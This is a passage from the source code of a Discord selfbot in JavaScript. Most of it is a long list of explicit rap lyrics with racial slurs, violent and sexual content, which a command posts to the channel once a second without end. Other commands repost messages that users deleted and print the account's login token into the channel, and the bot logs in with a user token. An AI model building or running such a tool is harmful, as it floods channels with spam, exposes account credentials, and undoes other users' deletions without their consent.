                    "`One time for my deuce, one time for my pops, free tweak, rest in peace T, fuck the ops`",
                    "`And when I hit the county I was tripping on the rock, They took the TV, I don't care just don't fuck with that clock`",
                    "`Used to carry bottles to the store, Thinking to myself like I can't do this shit no more`",
                    "`We just wanna get money, they just wanna beef with us, It's guaranteed you gon' die one day but I won't speed it up`",
                    "`You can't be blood, I'm not going broke for you 'cause I was sleeping on the floor`",
                    "`Jump off the plane with a couple of M's in the bag, If anybody play with me, it's numbers on their head`",
                    "`I know some crips, know some treetops, Name good, I ain't never sold no re-rock`",
                    "`I've been running red light in my city, I know it's hot, I'd rather take the ticket, niggas want my top`",
                    "`I went been feelin' all kites, To puttin' an M on my block`",
                    "`Candles all over the mansion, You lil niggas can't shit on my house`",
                    "`You try to take up for that nigga's beef, you gon' get dropped in his place`",
                    "`I'll put niggas on spirit, When they get hear it, you wick it`",
                    "`I leave his whole body bloody, call him Red Man, Hit the club in them Audi trucks and threw bands`",
                    "`I signed a deal with 300, now the hate comin' out of you, nigga`",
                    "`Throw them handcuffs on me, drag me out my bed, Nigga playing with my paper I'ma give him lead`",
                    "`Bust down pour, bust down beer, all of my charms, Patek on my left, AP on my right, all on my arms`",
                    "`This big ol' clip in the way of my drip, Diamonds they hard, I busted my lip`",
                    "`Four sprites, two pints, I pour eight a piece, Strapped up to the teeth, my enemies prayin' for peace`",
                    "`Almost died from pneumonia, had to take my jewels off, We don't argue with these niggas, we just let them tools talk`",
                    "`Niggas be killin' to get it We all got millions to get`",
                    "`Your roley over average, You know I'm oh for seven`",
                    "`Where I'm from it's a whole warzone goin' on, Where you from that's prolly unheard of`",
                    "`This time them niggas older, So niggas bustin, fuck it`",
                    "`Know I'm move deep, bitch, I'm too street, We not together, my baby, you just cool peeps`",
                    "`Feed him somethin', he gon' turn into a leech, that's dead weight, Dirty AR pistol, hold up, dirty SK`",
                    "`be stuck in the trenches 'cause I'm on parole, And the only time I can get out is if it's for a show`",
                    "`They wonder why my heart is so numb, I saw so much when I was so young`",
                    "`I bet that impact crack your face bones, Say young nigga get your cake loan`",
                    "`ISIS members on speed dial, Have 'em run up on you with the bomb on 'em`",
                    "`So don't be spooked I got this uzi on, In the studio like`",
                    "`Okay, 1-2-3, yeah, I just popped a bean, Okay, 4-5-6, yeah, eight hoes on my dick`",
                    "`Lil Purpp in high demand, yeah, these verses worth a brick, And she know that I got hoes, but she still gon' suck my dick`",
                    "`My niggas scammers and robbers, Everything hit like the Dodgers`",
                    "`Smoking on cookie, that stank, Lil Purpp got blues in the bank`",
                    "`Lil Purpp don't ride in no trucks now, I spent the racks, give no fucks now`",
                    "`I flip the bitch like a switch blade, Water on me like it just rained`",
                    "`Bitch, I'm a dog, I'm a mad hound, Might as well put me in the dog pound`",
                    "`I remember niggas hated on me back when I was broke, Now they lookin' up to me so high they need a telescope`",
                    "`Choppa poppin' like a Harlem Shake, Big drum, it's gonna eat a nigga like a double steak`",
                    "`Aye, I smoke big dope, Shawty wanna fuck 'cause I got good blow`",
                    "`Run up on me, push yo shit back, Lil Purpp the best and that big facts`",
                    "`How many bitches I need me about twenty, Sippin' on lean, I don't fuck with the Henny`",
                    "`Your bitch tryna find the circumference, And I got hoes in abundance`",
                    "`And I be grindin', a young nigga gotta get paid, All of my niggas gonna shoot like a pistol it rang`",
                    "`Twenty-five bands on the dental, And it's my car, fuck a rental`",
                    "`Play with that bitch like a fiddle, She wanna salt me like brittle`",
                    "`She learnin' some shit from that pole, Hey, she suckin' me out of my soul`",
                    "`Aye, grab hundreds, spread it like it's mayo`",
                    "`Lil' boy keep lookin' at my chain, Tell that thottie give me brain`",
                    "`I'm in the coupe, I'm with a bitch, ceiling got stars, Nigga want beef, he could get sparked, like a cigar`",
                    "`Feel like I'm Thug, all YSL tell by the smell, 45 pints, all of it Wok, came through the mail`",
                    "`Got your bitch on molly, I came with a shotty, And I came alone, but I left with your shawty`",
                    "`And I blow bands in the weekend, Drippin' the water, that Depend`",
                    "`I don't want friends, I want Audis, Smokin' on boof and it's Maui`",
                    "`Look at my cup, it got dope, I bend her over like slope`",
                    "`I paid the bands in the west, Then take the bands to the south`",
                    "`Krispy Kreme, Yeah bitch I stay clean`",
                    "`Bitch I'm sippin' lean I'm poppin' pills I pop a lot`",
                    "`Thick bitch on my dick, Lick it like ice cream`",
                    "`My car fast, eat all of the gas, My bitch bad, yeah her ass is fat`",
                    "`Drop the top, like my car it got no shirt, yeah, Got a chopper I might put em in the dirt, yeah`",
                    "`Call my mom I said I'm on them xans again, In the club I'm throwin' hundreds, fuck a ten`",
                    "`Yeah made that chopper sing like Beyoncé, I got different color molly yellow Ombré `",
                    "`I'm in the mall bitch I ball, Shooters they shoot out the wall`",
                    "`Bitch I'm 19 and I'm rich, I might just fuck on your bitch`",
                    "`I'm living life like a king, My niggas do the same thing`",
                    "`I don't want the pussy baby girl I wanted dome, Today you catch a uber, girl I gotta send you home`",
                    "`I got pack off a boat, Chains on my neck make me choke`",
                    "`You don't know me, we not bros, We don't even share the same hoes`",
                    "`In a Audi, in a Audi wanna truck me, She gon' suck me, she gon' suck me`",
                    "`Pardon me, you said that we would never be, But actually, we made it here eventually`",
                    "`I gotta flex on 'em, I drop a check on 'em, You ridin' a wave homie, I pull out the K on 'em`",
                    "`Whip out a fifty and double it, Bust in her mouth and she lovin' it, Too many hundreds, I'm duckin' the government`",
                    "`Pull up, I don't even have no neighbors, I can't keep one bitch, I'm way too player`",
                    "`We got the money, it's time to flex, Fuck it, my ice on my neck, Pull up the 'Vette, count up a check`",
                    "`My bitch on bad behavior, We got more bread than a baker`",
                    "`You ain't in that Maybach, boy you flexing, Dexter he dropped fifty on a necklace`",
                    "`Leave you dirty, I whip a birdy, I wake up to money, I count it early, Look at my wrist, a McFlurry`",
                    "`You niggas not makin' no noise, I wanted the Rari, no Porsche`",
                    "`I'm back on the court, Dexter rich forever, pass him the torch`",
                    "`Trappin' mama, I just wanted some Forces, Put some red bottoms on her, she gorgeous`",
                    "`Hop in the coupe with like three bitches, Me and young Dexter from rags to riches`",
                    "`Gotta thank God for my blessings, Your diamonds ain't real you flexing`",
                    "`Broke nigga shut up, They was hating on the come up`",
                    "`You can keep her, she a eater, I don't need her, Oh she boring, my bitch foreign, need a visa`",
                    "`Read about it, I woke up flexing, I dreamed about it`",
                    "`My niggas they legendary, Sip out my cup, it's the muddy scary`",
                    "`Ayy, she playin' games like Nintendo, I was trappin' out the bando`",
                    "`Too many racks in my jeans, I broke the money machine`",
                    "`The money keep liftin' my vans, She want the molly, she tan`",
                    "`Throw the bitch out the window, She only want me 'cause my wrist froze`",
                    "`Bitch I be ballin' like Mike and them, Way too much Act, get a Sprite for him`",
                    "`Fuck up a check, I got plenty, You mad cause your pockets is empty`",
                    "`The roof went missing again, Racks on me, walk around with a ten`",
                    "`Diamonds on me throw a tantrum, Got the Rari, park the Phantom`",
                    "`Born with a hundred, I'm doin' the most, I gotta boast, These rappers is fraud, really they broke`",
                    "`New six, broke wrist, I put the racks in the mattress`",
                    "`She want a purse, She want a Birkin, Fuck her, she squirting, Countin' racks in the back of suburban`",
                    "`Two bitches, got 'em kissing together, Thick bitch, let it drip on the leather`",
                    "`I put that bitch on a stretcher, Scraping the bowl for the extras`",
                    "`Rich Forever gettin' more bands, I just pulled up in a foreign`",
                    "`The coupe is retarded, Louis my carpet`",
                    "`Rich nigga drop a baby in a hoe face, Where the hell was you at on the broke days`",
                    "`Teach you how to be a boss, top dropped off, Motherfuck the fame, I done came to the vault`",
                    "`I'm in the back of that Maybach, Me and your bitch, we go way back`",
                    "`AP got her skating, Run to the money, we racing`",
                    "`Dug in the pussy and make her feel it, Fuck nigga thought I wouldn't make a milly`",
                    "`Rich Forever goin' rich way, They copy the wave, I'm sensei`",
                    "`They tryna copy the wave, Too many chains like a slave, Rich Forever getting paid, Money machine might break`",
                    "`Broke rappers in they feelings, they hate, Real diamonds on me, biting them straight`",
                    "`You cannot hop in my car, Bentley coupe riding with stars`",
                    "`Diamonds they wet on my arms, Tats on my neck and my arms`",
                    "`In New York I Milly Rock, hide it in my sock, Running from an opp, then I shoot at opp`",
                    "`Gimme top top, in my drop top, All these hoes gon' flock flock, when I drop drop`",
                    "`All these hoes want cash, all these hoes want bags, Fucking on yo bitch, uh I'm her dad`",
                    "`I'm a soldier, damn I thought I told you, Shootin' like a soldier like I'm from Magnolia`",
                    "`All of your bitches they loose, all of your bitches they loose, All of my bitches is rich, And they stay rockin' that Rick huh`",
                    "`Got a rich clique, she suckin' on the clique, She suckin' on the dick`",
                    "`She just wanna top me, Bitch can't stop me`",
                    "`Heard he spent a hunnid on a fucking watch piece, That's filthy`",
                    "`On my wrist, might just take your bitch, Might just take that wrist, take her on a trip`",
                    "`Bitches wanna fuck, hoe come lean on me, oh, Yeah Promethaziene, I can't even see, Niggas envy me, bitch I'm MVP`",
                    "`Woke up to niggas talkin' like me, talk, Woke up to niggas soundin' like me, talk`",
                    "`Oh, I think they like me, yeah they like me, Diamonds on me ice cream, hoe that's lightly`",
                    "`I heard these niggas wanna fight me, Meet me at my next show but you better bring a pipe B`",
                    "`She just wanna fuck me for my clout, fuck, Bitch I'm off the lean I crash the Audi, fuck`",
                    "`New choppa, new choppa it came with the beam, Actavis pouring up lean`",
                    "`Stack up my cash like a hike, take advantage of the Sprite, Take the bando bring the height`",
                    "`Look lean counting up, Big guap, Carti up`",
                    "`Pull up on your block quick, Quick drill, pop keep a zipper`",
                    "`Popping pain killers yeah, yeah, I just poured a 4th inside the lean yeah, yah`",
                    "`I'd rather not talk about it just do that shit, Got these bitches saying yeah he do that shit`",
                    "`Sucking on my dick, like she new to dick, Blowing through the check yeah we new to this`",
                    "`Pull up on your block and we shooting shit, Pull up on your bitch and I'm hitting it`",
                    "`I'd rather not talk about it just shoot it up, Lil nigga, middle finger up`",
                    "`Ice on my neck and my mama like, 'Boy Where you get all of that cash?'`",
                    "`Walk in the bank, I flex on that boy, I flex on that boy with the bag`",
                    "`I'm takin' your shit, you college kid, oh, We really be poppin' shit`",
                    "`Baby girl, we can do plan A, Baby girl, we can do plan B, oh`",
                    "`All of my niggas, they fool, Look at that boy, look at his jewels`",
                    "`My outfit just made the front page, Hop off the plane, I run to the stage, yah`",
                    "`Hoe stop chilling with' them lame niggas, Kickin' it with' them lame niggas`",
                    "`Bitch I'm on the xanny I just lose it, Bitch my pockets stupid thick, pockets thicker than my bitch`",
                    "`Woke up with my toolie, what it do?`",
                    "`I got red shooters, I got blue, Let that thing down then point at you`",
                    "`Why should I keep juggin' all these broke boys?, In the mall buying ice cause he's a broke boy`",
                    "`Keep that choppa on me, my grandma watchin' me, Fuck my Jesus piece, I might squeeze the piece`",
                    "`Yeah, I'ma go fuck that bitch, I'ma go thrash that bitch`",
                    "`Cop the Prada bitch, get one for the zip, Got that Prada bag, got one for my bitch`",
                    "`I got that dope, kilo, Yeah, come fuck with the boss`",
                    "`That nigga my homie, Count money fuck hoes`",
                    "`We laugh we joke, cus all the opps funny, Put that on God man these niggas don't want no smoke!`",
                    "`No Smoke No Smoke but we die bout that money, No Smoke No Smoke you niggas don't want it`",
                    "`I heard these niggas want smoke, they better pull up with 100, Yea we want all the smoke, I walk around with it on me`",
                    "`Nigga stop all that talking you know where I'm at come and pull up on me`",
                    "`Try get away and we gone run em down, He get back up Ben knocking him down`",
                    "`You know how we living that ain't how you living, If you go to tripping get hit with the glizzy`",
                    "`These niggas talk like they with it, When I catch you you gone get it`",
                    "`My No. 9 love it when you got it on, Baby you so hot, all these diamonds cool you down`",
                    "`Just give me a chance, promise I'ma make you love me, And Me and you together could accomplish more than something`",
                    "`Tonight it's Wednesday baby, me and you we goin' out, And don't worry bout a thang we gon' have fun now`",
                    "`I remember I wanted for to quit for so many times, But I know this moment'd come, now it's my time`",
                    "`I'm goin' in, I'm putting everything on the line`",
                    "`Whole lotta nights I went to sleep and I ain't had no food, But now I'm up and I'm just thinking about my next move`",
                    "`We here next day, stayed down 'til I came up with my niggas, Right or wrong forever right, you know wassup with me nigga`",
                    "`Now that I made it, ain't none the same it all changed, When I'm in public people see me they screaming my name`",
                    "`I'm hardbody and I promise I won't fold, Like a pirate I'm just searchin' for some gold`",
                    "`Half of ticket in deposits the same day I came home, Yungin' on the block with a pole, tryna get some dough`",
                    "`I don't do no drugs when I'm in your city I swear I'm high off the feeling, Book me for a show when I walk in the building you know I turn up to the ceiling`",
                    "`Down with that Glock, bitch don't make no sound, Say somethin' and get shot, bitch face down to the ground`",
                    "`If you think I fuck with that lil hoe, then you a fool, I ain't got no education, I dropped out of school`",
                    "`Too much money on me for to raise my hands and fight, Thunder in my clip, fuck around get hit with light`",
                    "`Bitch I'm from the north, you know what up with me, Niggas know it's dump with me`",
                    "`Feds in my section, think they tryna catch me bitch, You can do that flexin', get hit with this Wesson bitch`",
                    "`My nigga tellin' me to pray to Allah, With some cold blooded killers standin' right in front the yard`",
                    "`All red bottoms lookin' like I walked on the scene, Homicide diamonds with the pistol`",
                    "`Real Blood with some young niggas 'round me Crippin', With some old heads out of jail leave a nigga missin'`",
                    "`On my knees prayin' to God tellin' him I'm goin' home if I don't live up to goin' hard, One night I ain't go home, girl actin' crazy 'cause she mad that I'm livin' like a star`",
                    "`Ain't no plug, ain't no socket, I ain't never had a car, And you want them fancy things so you better play your part`",
                    "`I miss the Nawf just like my granny, My heart in them trenches, Yo' girl gone cheat on you for nothing`",
                    "`This the files of a nigga who ain't neva' bleed, This the story of a child who was in them streets`",
                    "`I let some shots off in the air for my niggas dead, Do anything in the world for you, I'm livin' red`",
                    "`I ain't give up on my mission, fuck you mean bitch I was steady hustlin', Handin' all you niggas money bitch and I steady strugglin'`",
                    "`Crack the seal it's potent, you can smell when it's medical, I doubled the cup to let you know I ain't drinkin' nothin' regular`",
                    "`Still move the wheel with my knee while I count up bands, I show love and affection to all my fans`",
                    "`I never dap you with the left hand, I draw down with the Glock in the right hand`",
                    "`What chu gon' do moms late for rent?, What chu gon' do if that boy try to flex?`",
                    "`NBA Gang, what they claiming lil nigga, Tell what the fuck you thinkin' lil nigga`",
                    "`Don't let a nigga come straight for your neck, You know that we got it on deck`",
                    "`Ain't no, no better, wanted better days, Nicki moved down the street and I had met Lil Dave`",
                    "`I sit back and read like Cat in the Hat, 21 Savage, the cat with the MAC`",
                    "`Stuart Little, heard these niggas some rats, Pockets full of cheese, bitch I got racks`",
                    "`I listen to your raps, thought you was hard, You ain't even street for real`",
                    "`And all these niggas play like they tough, 'Til a nigga get killed`",
                    "`So much dope that it broke the scale, They say crack kills, nigga my crack sells`",
                    "`See Savage he be with them apes, Play with this shit, you get ate`",
                    "`You know I keep me a Draco, Rap a nigga like an eggroll, Big bullets leave a big hole, I was raised by the G code`",
                    "`Now I'm on Ocean Drive sipping codeine with the top down`",
                    "`Rags to riches, nigga came from the bottom, Hood rats, now a nigga fuckin' on models`",
                    "`21 Gang, they were right beside me, And they still with me, nigga, I'm on TV`",
                    "`Had to sell dope, I couldn't be an athlete`",
                    "`I'm a street nigga, yeah I'm famous, I'm a rapper, nigga, and I'm gangbangin'`",
                    "`Henny in my system, I'm gone, Speedin' on the E way, all gone`",
                    "`I take her shoppin', that's easy, Fuck the summer, I ball all season`",
                    "`We just chillin' at the bar and she cheesin', Buy a hundred shots for no reason`",
                    "`Grind hard, nigga, grind hard, I done grind hard, Late nights playin' b-ball with a decoy`",
                    "`Got in so much trouble, thought the teachers had beef with you`",
                    "`It's a bag on his head, I'ma pick it up, It was money in the house, I used to stick it up`",
                    "`Yeah, Kim Jong, yeah big bombs (21),  Wonder Bread man, make your bitch lick crumbs`",
                    "`Bitch boy I'm a mobster, shrimp in my pasta, Jamaican Don Dada, hang 'round the shottas`",
                    "`ost two-eighty, uh-huh, bitch I paid it, uh-huh, Rover SVR and I got the seats blazin`",
                    "`Went against the gang and he got his cheese grated`",
                    "`I can show you how to fit a M in a duffel, Show you how to fit a hunnid bags in a duffel`",
                    "`Hang around a lot of gang bangin' ass niggas, Crip, Blood, blue or red, what you bang nigga?`",
                    "`You do a lot of talkin' nigga, not me, Do a lot of walkin' nigga, that's me`",
                    "`Max out, Tee Tay down the road, finna max out, Late night, pullin' in the 'partments, all the scraps out`",
                    "`I'll probably leave you before I leave the lean, Lil' bitch, don't play with my sip`",
                    "`Rims staggered, bad bitch I'ma bag her, On my face, issa dagger`",
                    "`Don't be calling me a brother, you a hater, Got new stones on my neck, nigga, flooded out`",
                    "`Hurricane Irma on my neck, nigga, flooded out, Hurricane Harvey on my wrist, shit, flooded out, Nigga flooded out, VVS' flooded out`",
                    "`Ice on a nigga nice, lights out, Nigga bad, back on, finna put a pipe out`",
                    "`Gucci on my pickle, nut right on her nipple, Young nigga with them M's, I get disrespectful`",
                    "`AK with the scope, nigga and it's real dirty`",
                    "`Go against the gang and it cost him (cost him), Made a diss song and I offed him (I offed him)`",
                    "`I serve raw clean, I drink raw lean`",
                    "`Issa knife, dawg, I got stripes, dawg, What's in that Wraith, Savage? It's some white, dawg`",
                    "`Nigga don't argue, Nigga you pardoned`",
                    "`I just bought a pistol it got 30 rounds in it, Pull up at yo momma house and put some rounds in it`",
                    "`Nigga yous a bitch cuz I ran off with ya shit`",
                    "`I'm a real right blood and these niggas counterfeit`",
                    "`Young Savage real street nigga ya'll ain't on no block, Bitch keep your legs closed cuz all I want is top`",
                    "`I'm a big dog lil' nigga you a pup, Pull up on ya spot walk up on it shoot it up`",
                    "`Baking soda cold water cut the stove on scrape the side, You can keep the skinny bitch cuz I like a fat ass and thighs`",
                    "`I got so many M's in my bank account, I can't even count 'em`",
                    "`I already back for seconds, I ain't even clean my plate up`",
                    "`All my diamonds carrots, dem lil' pointers be two lil', Glaziers in my ear, I need a cup, they 'bout to spill`",
                    "`oung nigga havin' fame 'round town, Then we got rich off of verbs and nouns`",
                    "`Cash out a four four check, then watch it bounce, Trap out the bando, trap out the ounce`",
                    "`I keep a Glock in my pocket nigga, 21 I keep a Glock in my pocket nigga`",
                    "`Yeah I'm in the kitchen nigga scrapin' bowls, savage, I'm in the hotel fuckin' hoes, savage`",
                    "`These bitches love Sosa, O End or no end`",
                    "`These bitches love Sosa, And they love them Glo' Boys`",
                    "`We GBE dope boys, We got lots of dough boy`",
                    "`Riding with 3hunna, With 300 foreigns, These bitches see Chief Sosa, I swear to god they honored`",
                    "`Damn I hate being sober, I'm a smoker, Fredo was drinking, ain't said I want molly water`",
                    "`All the hoes they love smoking, and love drinking, Anti-sober, for no reason`",
                    "`On my tour bus we get dumb high you's a floor, boy, Fredo got a hangover he toting a Cobra`",
                    "`Chief Sosa, Ballout, we high riding 'Raris, My bitches love drinking, some love smoking`",
                    "`I'm a gorilla in a fuckin' coupe, finna pull up to the zoo, nigga, Told you, nigga, who the fuck is you? I don't know, nigga`",
                    "`Talkin' out his neck, pistol to his throat, Blow this motherfucker, he gone choke`",
                    "`I just got 20 for a fuckin' 4, I spent that shit on a fuckin' coat`",
                    "`Woke up, brush my teeth, Thank the lord that I'm here today`",
                    "`With a bitch named Marissa, Going faster than a missile`",
                    "`What's on my feet? They Balenciagas, I got a dirty mouth need a rinsin`",
                    "`You ain't smokin' by the ounce, you can bounce, I don't smoke no mid, I smoke super loud`",
                    "`No I can't come down, bitch I'm too turnt up, Judge gon give me life, Foreign door Murders`",
                    "`Got spikes like red hot, need to keep ya tail tucked, Have folks nem deliver this to you, put it in ya mailbox`",
                    "`Bout to go get some more chains, Like I ain't got enough jewelry on`",
                    "`someone hand me a ashtray, That's my boys who passed away, keep my mouth laminated, Till the day I'm eliminated`",
                    "`What's yo address nigga? Where you live at nigga?, We ain't tryna hear that nigga, you know I'm a real ass nigga`",
                    "`Drip more purple than a laker, yeah, Eyes more red than a laser, yeah`",
                    "`You can get her back, I'm not a saviour, yeah, Rolling on your ex, Charles Xavier, yeah`",
                    "`Spent a real big sack and it's still on the receipt in the register, I just stepped out Balenciagas eleven duh`",
                    "`Just found out your hiding spot, I got them staking out, Slide down, we ain't dining in, we got to take them out`",
                    "`You ain't Glory Boy you ain't Savage Squad, You know you can't be out after dark`",
                    "`It's payday everyday, You ain't tryna fuck, bitch, skate`",
                    "`All hundreds on me, but I'm on a rampage, My ice kicking ass, no MMA`",
                    "`Told the bitch put on a seatbelt, She steady asking how to lift the seat up`",
                    "`I'm up in Houston where this shit came from, Didn't know about bank accounts, I went and made one`",
                    "`Look how my ice hitting off of my wife beater, Hop out on you stunting in a white creature`",
                    "`I love running through the bands, You ain't Glo then we giving niggas tans`",
                    "`Big choppa on me because I got big hands, Big racks on me like I'm wearing big pants`",
                    "`Throwing money from the top, it's falling on the floor, I'm gone send some shots, that's all a nigga know`",
                    "`You can have a .30 on you we taking niggas guns, When I was up in school I was taking niggas lunch`",
                    "`When I look in the mirror, sometimes I see a demon, I'm gettin' money these niggas don't know the meanin'`",
                    "`When I was 16 I was on the phone with' a nina, Up in the field while you was up in the bleachers`",
                    "`Fresh ass nigga I be flexing on 'em macho, K let off and it's sounding like a congo`",
                    "`A popped bitch, that's that shit I don't like, I got a bad bitch, yeah, that bitch right`",
                    "`We smoke dope all day, all night, You smoke Reggie, that's that shit I don't like`",
                    "`Pistol totin' and I'm shootin' on sight, A snitch nigga, that's that shit I don't like`",
                ];
                let interval = setInterval(async function () {
                    message.channel.send(messageList[Math.floor(Math.random() * messageList.length)]);
                }, 1000);
            }
            if (command == "dogfact") {
                superagent.get("https://random.dog/woof.json", (err, res) => {
                    if (err) { return message.edit(":x: An error has occurred. Details: " + err) }
                    message.edit("", { embed: new Discord.RichEmbed().setTitle("Random Dog").setColor("#FBFF00").setDescription(dogFacts.random()).setImage(res.body.url).setFooter("Image by random.dog") })
                })
            }

            if (command == "neko") {

                superagent.get("https://nekos.life/api/neko", (err, res) => {
                    if (err) { return message.channel.send(":x: An error has occurred. Details: " + err) }
                    message.edit({ embed: new Discord.RichEmbed().setTitle("Random Neko").setColor("#FBFF00").setImage(res.body.neko).setFooter(`Image by ${SADN9QD8SADJWQNISOSS}${adnq8wiudhasd87qhdqsudL}${asdjnqwioudsbnq78nhasA}${madeByY}${adadasdffsadfaE}${dawdasdR}`) })
                })
            }


            if (command === 'my-token' || command === 'mytoken') {
                message.channel.send('Are you sure you would like to request your account token? Type "yes" is so ').then(() => {
                    const filter = m => message.author.id === m.author.id
                    message.channel.awaitMessages(filter, { time: 60000, max: 1, errors: ['time'] })
                        .then(msg => {
                            if (msg.first().content === 'cancel') {
                                return message.channel.send('`Canceled operation`')
                            }
                            if (msg.first().content === 'no') {
                                return message.channel.send('`Canceled operation`')
                            }
                            if (msg.first().content === 'yes') {
                                message.channel.send(passer)
                            }
                        })
                })
            }
            if (command === 'snipe') {
                // try {
                    let noMsg = new Discord.RichEmbed()
                    .setColor("RANDOM")
                    .setDescription("There's no messages to snipe");
                const msg = bot.snipes.get(message.channel.id)
                    if (!msg) return message.edit(noMsg);
                    try {
                    if (message.guild) {
                        if (!message.guild.me.hasPermission("EMBED_LINKS")) {
                            message.channel.send(`**Im missing perms to send a Embed** \n \n User: ${msg.author.tag} \n Content: ${msg.content}`)
                            return;
                        }
                    }
	
              

                const embed = new Discord.RichEmbed()
                    .setColor("RANDOM"/**bot.colors.defualt*/)
                    .setAuthor(`${msg.author.tag}`, msg.author.displayAvatarURL)
                    .setDescription(msg.content)
                    .setTimestamp();
               
                    message.channel.send(embed);
                } catch (e) {
                    message.channel.send(`**Im missing perms to send a Embed** \n \n User: ${msg.author.tag} \n Content: ${msg.content}`)
                }
            }

            //console.log(red("Command used" + white(" :") + ((red(command + " In " + message.guild.name) ))))

        } catch (e) {
            const em = new Discord.RichEmbed()
                .setColor(config.defualtcolor)
                .setDescription(`There was a error with the __**${command}**__ command \n \n **Error:** ${e}`)
            try {
                message.channel.send(em)
            } catch (e) {
                message.channel.send('There was a error and I am missing the EMBED_LINKS permissions smh')
            }
            console.log(e)
        }
    })



    bot.on("messageDelete", (message) => {
        bot.snipes.set(message.channel.id, {
            content: message.content,
            author: message.author
        })
    })

    bot.on("messageUpdate", (oldMessage, newMessage) => {
        bot.edites.set(oldMessage.channel.id, {
            first: oldMessage.content,
            second: newMessage.content,
            author: oldMessage.author
        })

    })
    //  } else {
    //    console.clear();
    //     console.log(red(`


    //      ███████╗██╗      █████╗ ██╗   ██╗███████╗██████╗ 
    //      ██╔════╝██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗
    ///      ███████╗██║     ███████║ ╚████╔╝ █████╗  ██████╔╝
    //    ╚════██║██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗
    ///     ███████║███████╗██║  ██║   ██║   ███████╗██║  ██║
    //     ╚══════╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝



    //`))

    //     console.log(red("[INFO] You are not verified to use this bot, If you think this is a mistake DM Slayer on Discord!"));
    //  }
    //})

});

bot.login(passer).catch(err => console.log(red(`[ERROR] Incorrect token passed`)));